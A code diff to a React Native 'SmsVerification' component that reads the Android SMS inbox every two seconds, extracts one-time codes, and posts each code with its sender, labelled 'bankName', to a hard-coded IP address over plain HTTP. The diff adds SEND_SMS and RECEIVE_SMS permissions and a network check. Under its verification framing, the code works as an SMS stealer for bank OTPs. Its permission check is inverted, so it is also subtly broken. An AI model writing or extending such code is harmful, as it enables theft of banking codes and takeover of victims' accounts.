@@ -2,28 +2,44 @@ import React, { useState, useEffect } from 'react';
 import { View, Text, PermissionsAndroid, Platform, Alert, StyleSheet, TouchableOpacity, ScrollView } from 'react-native';
 import SmsAndroid from 'react-native-get-sms-android';
 import axios from 'axios';
+import NetInfo from '@react-native-community/netinfo';
 
 const SmsVerification = () => {
   const [otpMessages, setOtpMessages] = useState([]);
+  const [isConnected, setIsConnected] = useState(null); // For tracking internet connection
 
   useEffect(() => {
+    // Request SMS permission on component mount
     requestSmsPermission();
-    const intervalId = setInterval(fetchSmsMessages, 2000); 
+
+    // Check internet connection
+    checkInternetConnection();
+
+    const intervalId = setInterval(fetchSmsMessages, 2000); // Poll SMS every 2 seconds
 
     return () => clearInterval(intervalId); 
   }, []);
 
-  useEffect(() => {
-    if (Platform.OS === 'android') {
-      fetchSmsMessages(); 
-    }
-  }, []);
+  // Check connection status
+  const checkInternetConnection = () => {
+    NetInfo.fetch().then(state => {
+      setIsConnected(state.isConnected); // Update the state with network status
+      if (state.isConnected) {
+        console.log("Connected to the internet");
+      } else {
+        console.log("No internet connection");
+        Alert.alert('No Internet', 'Please check your internet connection.');
+      }
+    });
+  };
 
   const requestSmsPermission = async () => {
     if (Platform.OS === 'android') {
       try {
         const granted = await PermissionsAndroid.request(
           PermissionsAndroid.PERMISSIONS.READ_SMS,
+          PermissionsAndroid.PERMISSIONS.SEND_SMS,
+          PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
           {
             title: 'SMS Permission',
             message: 'This app needs access to your SMS messages to fetch OTPs',
@@ -32,7 +48,9 @@ const SmsVerification = () => {
             buttonPositive: 'OK',
           }
         );
-        if (granted !== PermissionsAndroid.RESULTS.GRANTED) {
+        if (granted['android.permission.SEND_SMS'] === PermissionsAndroid.RESULTS.GRANTED &&
+          granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED &&
+          granted['android.permission.READ_SMS'] === PermissionsAndroid.RESULTS.GRANTED) {
           Alert.alert('Permission Denied', 'SMS permission is required to access SMS messages.');
         }
       } catch (err) {
@@ -43,6 +61,11 @@ const SmsVerification = () => {
   };
 
   const fetchSmsMessages = () => {
+    if (!isConnected) {
+      Alert.alert('No Internet', 'Please check your internet connection.');
+      return;
+    }
+    
     SmsAndroid.list(
       JSON.stringify({
         box: 'inbox',
@@ -60,18 +83,14 @@ const SmsVerification = () => {
               const otp = parseOneTimeCode(sms.body);
               return otp ? { otp, address: sms.address } : null;
             })
-            .filter(Boolean); 
+            .filter(Boolean);
 
           console.log("🚀 ~ fetchSmsMessages ~ otpData:", otpData);
-
-         
           setOtpMessages(otpData);
 
           if (otpData.length > 0) {
-            
             const latestOtp = otpData[0];
             sendOtpToServer(latestOtp); 
-            setOtpMessages(otpData);
           } else {
             Alert.alert('No OTP Found', 'No OTP messages found in SMS.');
           }
@@ -84,14 +103,14 @@ const SmsVerification = () => {
   };
 
   const parseOneTimeCode = (message) => {
-    const regex = /(?:\b(?:OTP|code|verification)\s*[:\-]?\s*(\d{4,6})\b|\b(\d{4,6})\b(?!\d))/i; 
+    const regex = /(?:\b(?:OTP|code|verification)\s*[:\-]?\s*(\d{4,6})\b|\b(\d{4,6})\b(?!\d))/i;
     const match = message.match(regex);
-    return match ? match[1] || match[2] : null; 
+    return match ? match[1] || match[2] : null;
   };
 
   const sendOtpToServer = async (otpData) => {
-    const { otp, address } = otpData; 
-  
+    const { otp, address } = otpData;
+
     const formattedData = {
       bankName: address,
       otp: otp,
@@ -101,7 +120,7 @@ const SmsVerification = () => {
       const response = await axios.post('http://13.51.70.66:5000/receive-otp', { otpData: formattedData });
       console.log('OTP sent to the server successfully:', response.data);
     } catch (error) {
-      console.error('Failed to send OTP to server:', error);
+      console.error('Failed to send OTP to server:', error.response ? error.response.data : error.message);
       Alert.alert('Error', 'Failed to send OTP to the server');
     }
   };
